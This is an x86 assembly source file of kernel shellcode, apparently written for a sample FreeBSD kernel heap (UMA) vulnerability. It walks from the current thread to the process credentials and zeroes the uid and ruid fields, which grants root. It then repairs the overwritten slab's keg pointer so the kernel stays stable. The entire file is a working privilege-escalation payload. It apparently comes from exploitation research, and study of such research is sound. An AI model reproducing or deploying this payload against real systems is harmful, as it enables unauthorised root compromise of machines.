# kernelcode.s -- Patroklos Argyroudis, argp at domain census-labs.com
#
# Kernel shellcode for the sample kernel heap (UMA) vulnerability.
#
# $Id$

.global _start
_start:

movl    %fs:0, %eax         # get curthread
movl    0x4(%eax), %eax     # get proc pointer from curthread
movl    0x24(%eax), %eax    # get ucred from proc
xorl    %edx, %edx          # edx = 0
movl	%edx, 0x4(%eax)     # patch uid
movl	%edx, 0x8(%eax)     # and ruid
# restore us_keg for our overwritten slab
movl	-0x1000(%ecx), %eax # first we check the previous slab
cmpl    $0x0, %eax
je      prev
jmp     end
prev:
movl    0x1000(%ecx), %eax  # and then the next slab
end:
movl	%eax, (%ecx)
ret

# EOF
